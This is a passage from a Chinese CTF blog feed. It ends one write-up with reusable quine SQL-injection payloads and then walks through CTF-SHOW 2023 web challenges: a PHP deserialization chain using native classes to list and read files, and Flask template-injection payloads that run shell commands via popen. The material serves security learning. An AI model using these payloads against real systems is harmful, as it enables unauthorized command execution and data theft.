class="line">B:&#x27;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#x27;</span><br></pre></td></tr></table></figure><p>双引号换位单引号-&gt;替换%</p><p>提供三种payload吧，以后如果再遇到这样的题目也能拿来直接用</p><ol><li><code>1&#39;/**/union/**/select/**/replace(replace(&#39;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)#</code></li><li><code>1&#39;union/**/select/**/replace(replace(&#39;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot;union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)#</code></li><li><code>1&#39;UNION(SELECT(REPLACE(REPLACE(&#39;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#39;,CHAR(34),CHAR(39)),CHAR(37),&#39;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#39;)))#</code></li></ol><p>第一个payload与第二个payload之间的差距：为第一个与union之间有空格，第二个无，本质上两个payload无区别</p><p>注意sql中为char()而不是chr() 网上payload需要转换</p><p>搞定：</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682598202760-5e0a4fac-7660-4486-bee9-9ef75f6b6530.png" alt="img"></p><p>至于时间盲注这个坑，以后遇到经典题型借助题目来总结吧，这里插个眼先:)</p><p>还有两道java题目就不复现了，java还是我没有解锁的领域，复现起来也很吃力，之后系统开始学java之后再来复现填坑吧。</p><h1 id="小尾巴"><a href="#小尾巴" class="headerlink" title="小尾巴"></a>小尾巴</h1><p>这次打完省赛（校赛bushi）虽然很水，但是成功爬进了学校的实验室，也算是一段时间的努力总算有了成果吧，进了实验室才是刚刚开始，自身还是有很多不足，需要继续努力，继续奋斗，干巴得！</p>]]></content>
      
      
      <categories>
          
          <category> 各赛事WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Smarty模板注入 </tag>
            
            <tag> js </tag>
            
            <tag> Yaml反序列化 </tag>
            
            <tag> shell反弹 </tag>
            
            <tag> quine注入 </tag>
            
            <tag> python3解析特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-SHOW 2023愚人杯 WEB部分WP</title>
      <link href="/post/186d5605.html"/>
      <url>/post/186d5605.html</url>
      
        <content type="html"><![CDATA[<p>CTF-SHOW 2023愚人杯 WEB部分WP</p><span id="more"></span><h1 id="Challenge-1-easy-signin"><a href="#Challenge-1-easy-signin" class="headerlink" title="Challenge_1 easy_signin"></a>Challenge_1 easy_signin</h1><p>这道题像是buuctf一个题目的套皮，查看源码和url，图片内容是以base64编码输出的，并且请求文件名称也是通过base64编码，直接查看index.php的内容，先编码一下index.php</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680677699456-4fddbbeb-4ad5-4059-9bd5-e8707545697e.png" alt="img"></p><p>payload：<code>?img=aW5kZXgucGhw</code></p><p>拿到base64加密后的内容</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680677766484-107ac894-6af0-47d9-babb-dbc944ecdae2.png" alt="img"></p><p>再去解密一下，拿到flag</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680677805971-9deab45d-79af-4408-9836-64167015721e.png" alt="img"></p><h1 id="Challenge-2-被遗忘的反序列化"><a href="#Challenge-2-被遗忘的反序列化" class="headerlink" title="Challenge_2 被遗忘的反序列化"></a>Challenge_2 被遗忘的反序列化</h1><p>这道题目没做出来，一开始就卡住了，他提示当前目录有个txt文件，那么就应该先去读这个文件获取相应的提示，不会啊，看了wp，发现用了php原生类读的，真的太强了</p><p>然后这道题预期解真的太麻烦了，还要涉及密码偏移问题，而且还要脚本爆破，非预期真的很简单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 当前目录中有一个txt文件哦</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;check.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EeE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eeee</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;text == <span class="string">&quot;aaaa&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">lcfirst</span>(<span class="variable">$this</span>-&gt;text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$kk</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$kk</span>,eeeeeeeeeeeee&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">new</span> cycycycy;</span><br><span class="line">        <span class="variable">$a</span> -&gt; <span class="title function_ invoke__">aaa</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cycycycy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$get</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>];</span><br><span class="line">        <span class="variable">$get</span> = <span class="title function_ invoke__">cipher</span>(<span class="variable">$get</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$get</span> === <span class="string">&quot;p8vfuv8g8v8py&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;eval&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a_a</span> = <span class="variable language_">$this</span> -&gt; a;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\$a_a\$&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$eeee</span>=<span class="string">&quot;-_-&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">coos</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span> -&gt; file))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;coos-&gt;name;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$aa</span> = <span class="variable language_">$this</span>-&gt;coos;</span><br><span class="line">            <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$aa</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|63|\*|\?/i&quot;</span>,<span class="variable">$this</span> -&gt; key))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;key = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span> -&gt; file);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;不行哦&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;aaa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; aaa = <span class="keyword">clone</span> <span class="keyword">new</span> EeE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_AAAAAA&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_ip</span>);</span><br></pre></td></tr></table></figure><p>直接来看这里：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$eeee</span>=<span class="string">&quot;-_-&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;name))&#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">coos</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span> -&gt; file))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;coos-&gt;name;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$aa</span> = <span class="variable language_">$this</span>-&gt;coos;</span><br><span class="line">            <span class="variable">$bb</span> = <span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$aa</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><p><code>$a = new $this-&gt;coos($this-&gt;file);</code> 这一行 看到这里我们是不是可以构造一个可变函数 形如：$a($b)的形式达到getshell的操作 但是这里有个new 将类实例化 也就意为着不能通过这样来构造可变函数</p><p>那么这里就用到了php的原生类，具体看这篇文章：<a href="https://blog.csdn.net/cjdgg/article/details/115314651">https://blog.csdn.net/cjdgg/article/details/115314651</a></p><p>可遍历目录的原生类：</p><p>DirectoryIterator 类<br>FilesystemIterator 类</p><p>GlobIterator 类  </p><p>使用 DirectoryIterator 类<br>DirectoryIterator配合glob:&#x2F;&#x2F;协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。 </p><p>比如以这样的<code>/f*</code>形式模糊操作来获得flag的文件名</p><p>比如我win电脑上d盘根目录下存在一个blog文件,我就可以利用原生类再配合glob协议获取到该文件的具体文件名</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680679507460-93022bf0-b786-497a-ae92-c77e7bcaad71.png" alt="img"></p><p>回到题目：本地构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$w</span>=<span class="keyword">new</span> <span class="title function_ invoke__">w_wuw_w</span>();</span><br><span class="line"><span class="variable">$w</span>-&gt;aaa=<span class="keyword">new</span> <span class="title function_ invoke__">gBoBg</span>(); <span class="comment">//通过类W_WUW_W中的析构函数来调用类gBoBg中的__toString魔术方法</span></span><br><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;name=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;file=<span class="string">&quot;glob:///f*&quot;</span>;</span><br><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;coos=<span class="string">&quot;DirectoryIterator&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$w</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后这里传参是通过请求包中AAAAAA来传参的蛮新颖的</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680680020351-96a2b7d8-9c2b-4bae-a866-bdb03409e953.png" alt="img"></p><p>然后再通过读文件原生类来读flag</p><p>SplFileObject</p><p>本地构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gBoBg</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$coos</span>;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w_wuw_w</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$w</span>=<span class="keyword">new</span> <span class="title function_ invoke__">w_wuw_w</span>();</span><br><span class="line"><span class="variable">$w</span>-&gt;aaa=<span class="keyword">new</span> <span class="title function_ invoke__">gBoBg</span>(); <span class="comment">//通过类W_WUW_W中的析构函数来调用类gBoBg中的__toString魔术方法</span></span><br><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;name=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;file=<span class="string">&quot;/f1agaaa&quot;</span>;</span><br><span class="line"><span class="variable">$w</span>-&gt;aaa-&gt;coos=<span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$w</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680680133216-6324145c-b089-45c1-b238-7e7d2e81a43b.png" alt="img"></p><h1 id="Challenge-3-easy-ssti"><a href="#Challenge-3-easy-ssti" class="headerlink" title="Challenge_3 easy_ssti"></a>Challenge_3 easy_ssti</h1><p>这道题还是蛮简单的 根据题目是一个模板注入的题目</p><p>查看源码 下载一个压缩包</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask</span><br><span class="line"><span class="keyword">from</span> flask import render_template_string,render_template</span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/hello/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">hello</span>(name=None):</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">render_template</span>(<span class="string">&#x27;hello.html&#x27;</span>,name=name)</span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/hello/&lt;name&gt;&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">hellodear</span>(name):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;ge&quot;</span> in name:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">render_template_string</span>(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    elif <span class="string">&quot;f&quot;</span> not in name:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">render_template_string</span>(<span class="string">&#x27;hello %s&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Nonononon&#x27;</span></span><br></pre></td></tr></table></figure><p>一眼顶针，flask的模板注入</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680680541981-d158f0ea-eb91-455f-96f7-e07327426721.png" alt="img"></p><p>然后网上payoad太多了（<a href="https://blog.csdn.net/qq_46918279/article/details/121270806%EF%BC%89">https://blog.csdn.net/qq_46918279/article/details/121270806）</a></p><p>这里主要过滤了斜杠，可以用<code>$&#123;HOME:0:1&#125;</code>绕过</p><p>payload: </p><p><code>&#123;&#123;get_flashed_messages.__globals__['os'].popen('whoami').read()&#125;&#125;</code></p><p><code>&#123;&#123;().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__['popen']('cat $&#123;HOME:0:1&#125;[e-g]lag').read()&#125;&#125;</code> </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680680569196-d457fb09-796e-4298-a9cc-6d686b500d42.png" alt="img"></p><h1 id="challenge-4-easy-flask"><a href="#challenge-4-easy-flask" class="headerlink" title="challenge_4 easy_flask"></a>challenge_4 easy_flask</h1><p>这道题目快做出来了，最后一步没有去读取当前目录下的app.py的文件去看源码，真给自己无语住了，脑子被大便灌了一样</p><p>回到题目：</p><p>看标题还是关于flask模板的漏洞</p><p>申请一个账号进去</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680681197676-57ac85a1-3064-41a1-83d0-732cb4a05b0d.png" alt="img"></p><p>最后一句话他说只会给admin给一些东西，那么目标就很明确了，flask模板常见的session伪造，找一个脚本伪造就行了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680681282376-730ae4d5-a1ae-4d8f-a582-40b6713c5101.png" alt="img"></p><p>之后给到一个假的flag 然后注意到他请求方式</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680681334740-bdbc1132-befd-4deb-b14f-7f1c618c8af1.png" alt="img"></p><p>他现在给的源代码只是一部分，我们应该通过读app.py来获取完整的源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line"><span class="keyword">from</span> flask import Flask, render_template, request, redirect, url_for, session, send_file, Response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">&#x27;S3cr3tK3y&#x27;</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>: &#123;<span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;LKHSADSFHLA;KHLK;FSDHLK;ASFD&#x27;</span>, <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">index</span>():</span><br><span class="line">    <span class="comment"># Check if user is loggedin</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;loggedin&#x27;</span> in session:</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="title function_ invoke__">url_for</span>(<span class="string">&#x27;profile&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">redirect</span>(<span class="title function_ invoke__">url_for</span>(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def <span class="title function_ invoke__">login</span>():</span><br><span class="line">    msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;username&#x27;</span> in request.form <span class="keyword">and</span> <span class="string">&#x27;password&#x27;</span> in request.form:</span><br><span class="line">        username = request.form[<span 